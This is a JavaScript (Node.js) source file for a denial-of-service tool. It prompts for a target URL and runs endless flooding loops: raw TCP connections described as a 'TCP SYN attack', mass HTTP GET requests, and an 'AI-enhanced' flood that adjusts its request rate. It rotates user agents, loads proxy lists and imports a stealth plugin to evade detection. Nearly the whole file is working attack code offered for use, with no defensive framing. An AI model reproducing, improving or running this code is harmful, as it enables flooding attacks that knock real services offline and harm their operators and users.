import chalk from 'chalk'; // For colored console output
import http from 'http'; // For making HTTP requests
import fs from 'fs'; // For reading files
import net from 'net'; // For creating TCP connections
import { EventEmitter } from 'events'; // For handling events
import { createInterface } from 'readline'; // For reading input from the console
import { isMainThread, Worker, workerData } from 'worker_threads'; // For multi-threading support
import puppeteer from 'puppeteer-extra'; // Puppeteer for browser automation
import StealthPlugin from 'puppeteer-extra-plugin-stealth'; // Stealth plugin to avoid detection

// Configuring maximum event listeners to avoid warnings
EventEmitter.defaultMaxListeners = 0;

// Configuration settings for the script
const config = {
    MAX_RAM_PERCENTAGE: 50, // Maximum RAM usage percentage
    TIMEOUT_MS: 10000, // Timeout for requests in milliseconds
    INITIAL_CONCURRENT_REQUESTS: 500, // Initial number of concurrent requests to send
    MAX_CONCURRENT_REQUESTS: 10000, // Maximum number of concurrent requests allowed
    RETRY_LIMIT: 5, // Number of times to retry a request on failure
    INITIAL_RETRY_DELAY: 100, // Initial delay before retrying a request (in milliseconds)
    BACKOFF_FACTOR: 2, // Factor to increase the delay for successive retries
    RANDOM_DELAY_MIN: 100, // Minimum random delay between requests (in milliseconds)
    RANDOM_DELAY_MAX: 1000, // Maximum random delay between requests (in milliseconds)
};

// Global variables to hold state
let proxyList = [], // Array to store proxy servers
    userAgentList = [], // Array to store user agents
    successCount = 0, // Counter for successful requests
    failureCount = 0; // Counter for failed requests

// Function to log messages with a timestamp
function logMessage(message) {
    const currentTime = new Date().toISOString(); // Get the current time in ISO format
    console.log(chalk.green(`[${currentTime}] ${message}`)); // Log the message with green color
}

// Class to manage request rates dynamically
class SimpleAI {
    constructor() {
        this.previousSuccessRate = 0.1; // Initial success rate
        this.requestRates = [config.INITIAL_CONCURRENT_REQUESTS]; // Array to store request rates
    }

    // Method to adjust the request rate based on success and failure counts
    adjustRequestRate(successCount, failureCount) {
        const successRate = successCount / (successCount + failureCount || 1); // Calculate success rate
        if (successRate < this.previousSuccessRate) { // If success rate decreases
            const adjustment = Math.floor(this.requestRates[this.requestRates.length - 1] * this.previousSuccessRate);
            this.requestRates.push(Math.max(1, adjustment)); // Push adjusted rate to the array
        } else { // If success rate increases
            const adjustment = Math.floor(this.requestRates[this.requestRates.length - 1] * this.previousSuccessRate);
            this.requestRates.push(this.requestRates[this.requestRates.length - 1] + adjustment); // Increment the rate
        }
        this.previousSuccessRate = successRate; // Update the previous success rate
        return this.requestRates[this.requestRates.length - 1]; // Return the current request rate
    }
}

// Function to read proxy servers from a specified file
const readProxies = (filePath) => {
    try {
        const fileContent = fs.readFileSync(filePath, 'utf-8'); // Read file contents
        proxyList = fileContent.split('\n').filter(Boolean); // Split by new line and filter out empty lines
        logMessage(`Proxies loaded: ${proxyList.length}`); // Log the number of proxies loaded
    } catch (error) {
        console.error('Error loading proxies:', error.message); // Log any errors
        process.exit(1); // Exit the process on error
    }
};

// Function to read user agents from a specified file
const readUserAgents = (filePath) => {
    try {
        const fileContent = fs.readFileSync(filePath, 'utf-8'); // Read file contents
        userAgentList = fileContent.split('\n').filter(Boolean); // Split and filter
        logMessage(`User agents loaded: ${userAgentList.length}`); // Log the number of user agents loaded
    } catch (error) {
        console.error('Error loading user agents:', error.message); // Log errors
        process.exit(1); // Exit on error
    }
};

// Function to get a random proxy from the proxy list
const getRandomProxy = () => {
    return proxyList[Math.floor(Math.random() * proxyList.length)]; // Randomly select a proxy
};

// Function to get random header values, including User-Agent
const getRandomHeaderValues = () => {
    return {
        'User-Agent': userAgentList[Math.floor(Math.random() * userAgentList.length)], // Random User-Agent
        'Accept-Language': 'en-US,en;q=0.9', // Example of another header
        // Add more headers as needed
    };
};

// Function for making HTTP requests with retries
const requestPromise = async (urlObj, retryCount) => {
    return new Promise((resolve) => {
        const startTime = Date.now(); // Record the start time for response time tracking
        const proxy = getRandomProxy(); // Select a random proxy from the list
        const headers = getRandomHeaderValues(); // Get random header values (like User-Agent)

        // Set up the request options
        const options = {
            hostname: urlObj.hostname,
            port: urlObj.port || 80, // Default to port 80 if not specified
            path: urlObj.pathname + urlObj.search, // Full path for the request
            method: 'GET', // HTTP method
            headers: headers,
            timeout: config.TIMEOUT_MS, // Timeout from the configuration
        };

        // Make the actual HTTP request
        const req = http.request(options, (res) => {
            successCount++; // Increment successful request count
            res.on('data', () => { }); // Consume data to avoid memory leaks
            res.on('end', () => {
                const responseTime = Date.now() - startTime; // Calculate response time
                logMessage(`Response time: ${responseTime}ms`); // Log the response time
                resolve(); // Resolve the promise indicating the request has completed
            });
        });

        // Handle errors that occur during the request
        req.on('error', async (error) => {
            failureCount++; // Increment failed request count
            logMessage('Request error: ' + error.message); // Log the error message
            if (retryCount > 0) { // Check if we can retry
                await new Promise(r => setTimeout(r, config.INITIAL_RETRY_DELAY)); // Wait before retrying
                resolve(await requestPromise(urlObj, retryCount - 1)); // Retry the request
            } else {
                resolve(); // Resolve without retrying if limit reached
            }
        });

        req.end(); // End the request
    });
};

// Function to make TCP SYN requests (Attack Method V1)
const makeRequestV1 = async (url, numRequests) => {
    const urlObj = new URL(url); // Parse the URL
    const ports = [80, 443]; // Define ports to use (HTTP and HTTPS)

    logMessage(`Starting TCP SYN attack on ${url}...`); // Log the start of the attack
    while (true) { // Infinite loop for continuous requests
        const requests = Array.from({ length: numRequests }, () => { // Create an array of promises for requests
            const port = ports[Math.floor(Math.random() * ports.length)]; // Randomly select a port
            const options = {
                host: urlObj.hostname, // Hostname from the URL
                port: port, // Selected port
                method: 'CONNECT', // Method for TCP SYN
                path: `${urlObj.hostname}:${port}`, // Path for the request
                timeout: config.TIMEOUT_MS, // Timeout from the configuration
            };
            return new Promise((resolve) => { // Return a new promise for each request
                const req = net.createConnection(options, () => { // Create a connection
                    successCount++; // Increment success count
                    req.end(); // End the request
                    resolve(); // Resolve the promise
                });
                req.on('error', () => { // Handle connection errors
                    failureCount++; // Increment failure count
                    resolve(); // Resolve promise on error
                });
                req.setTimeout(config.TIMEOUT_MS, () => { // Set timeout for the request
                    req.destroy(); // Destroy the connection if it times out
                    failureCount++; // Increment failure count
                    resolve(); // Resolve promise on timeout
                });
            });
        });
        await Promise.all(requests); // Wait for all requests to complete
        logMessage(`Success: ${successCount}, Failures: ${failureCount}`); // Log success and failure counts
        await new Promise((r) => setTimeout(r, Math.random() * (config.RANDOM_DELAY_MAX - config.RANDOM_DELAY_MIN) + config.RANDOM_DELAY_MIN)); // Random delay between iterations
    }
};

// Method V2: Simultaneous HTTP requests
const executeRequestV2 = async (url, numRequests) => {
    const urlObj = new URL(url); // Parse the URL
    const ports = [80, 443]; // Define ports to use
    logMessage(`Initiating simultaneous HTTP requests on ${url}...`); // Log the start of the attack
    while (true) { // Infinite loop for continuous requests
        const requests = Array.from({ length: numRequests }, () => { // Create an array of promises for requests
            return new Promise((resolve) => {
                const port = ports[Math.floor(Math.random() * ports.length)]; // Randomly select a port
                const options = {
                    hostname: urlObj.hostname, // Hostname from the URL
                    port: port, // Selected port
                    path: urlObj.pathname + urlObj.search, // Path for the request
                    method: 'GET', // HTTP method
                    headers: getRandomHeaderValues(), // Get random header values
                    timeout: config.TIMEOUT_MS, // Timeout from the configuration
                };
                const req = http.request(options, (res) => { // Make the HTTP request
                    res.on('data', (chunk) => { }); // Consume response data
                    res.on('end', () => { // When response ends
                        successCount++; // Increment success count
                        resolve(); // Resolve promise
                    });
                });
                req.on('error', () => { // Handle request errors
                    failureCount++; // Increment failure count
                    resolve(); // Resolve promise on error
                });
                req.end(); // End the request
            });
        });
        await Promise.all(requests); // Wait for all requests to complete
        logMessage(`Success: ${successCount}, Failures: ${failureCount}`); // Log success and failure counts
        await new Promise((r) => setTimeout(r, Math.random() * (config.RANDOM_DELAY_MAX - config.RANDOM_DELAY_MIN) + config.RANDOM_DELAY_MIN)); // Random delay between iterations
    }
};

// Method V3: AI-enhanced requests
const makeRequestV3 = async (url) => {
    const urlObj = new URL(url); // Parse the URL
    const simpleAI = new SimpleAI(); // Create an instance of the SimpleAI class
    let currentRate = config.INITIAL_CONCURRENT_REQUESTS; // Initialize current request rate

    logMessage('Starting AI-enhanced attack...'); // Log the start of the attack
    try {
        while (true) { // Infinite loop for continuous requests
            const requests = Array.from({ length: currentRate }, () => requestPromise(urlObj, config.RETRY_LIMIT)); // Create requests based on current rate
            await Promise.all(requests); // Wait for all requests to complete
            logMessage(`Success: ${successCount}, Failures: ${failureCount}`); // Log success and failure counts
            currentRate = simpleAI.adjustRequestRate(successCount, failureCount); // Adjust request rate based on performance
            await new Promise((resolve) => setTimeout(resolve, Math.random() * (config.RANDOM_DELAY_MAX - config.RANDOM_DELAY_MIN) + config.RANDOM_DELAY_MIN)); // Random delay between iterations
        }
    } catch (error) {
        logMessage(`Error: ${error.message}`); // Log any errors
    }
};

// Main execution logic
if (isMainThread) {
    const rl = createInterface({ input: process.stdin, output: process.stdout }); // Create an interface for reading input

    rl.question('Enter the target URL: ', (url) => {
        rl.question('Enter the duration (seconds): ', (duration) => {
            rl.question('Enter the number of threads: ', (threads) => {
                rl.question('Enter the path for proxy file: ', (proxyFile) => {
                    rl.question('Enter the path for user agent file: ', (userAgentFile) => {
                        rl.question('Select method (V1, V2, or V3): ', (method) => {
                            rl.close(); // Close the input interface
                            readProxies(proxyFile); // Load proxies from file
                            readUserAgents(userAgentFile); // Load user agents from file
                            const numRequests = parseInt(threads, 10); // Parse number of threads
                            const durationMs = parseInt(duration, 10) * 1000; // Convert duration to milliseconds

                            // Start the appropriate attack method
                            if (method === 'V1') {
                                makeRequestV1(url, numRequests); // Start TCP SYN attack
                            } else if (method === 'V2') {
                                executeRequestV2(url, numRequests); // Start HTTP requests
                            } else if (method === 'V3') {
                                makeRequestV3(url); // Start AI-enhanced attack
                            } else {
                                logMessage('Invalid method selected.'); // Log if method is invalid
                            }
                        });
                    });
                });
            });
        });
    });
} else {
    const { url, method } = workerData; // Get data passed to the worker

    try {
        // Execute the appropriate attack method in the worker
        if (method === 'V3') {
            await makeRequestV3(url); // Start AI-enhanced attack in the worker
        } else if (method === 'V1') {
            await makeRequestV1(url, config.INITIAL_CONCURRENT_REQUESTS); // Start TCP SYN attack in the worker
        } else if (method === 'V2') {
            await executeRequestV2(url, config.INITIAL_CONCURRENT_REQUESTS); // Start HTTP requests in the worker
        }
    } catch (error) {
        logMessage('Worker encountered an error: ' + error.message); // Log any errors in the worker
    }
}
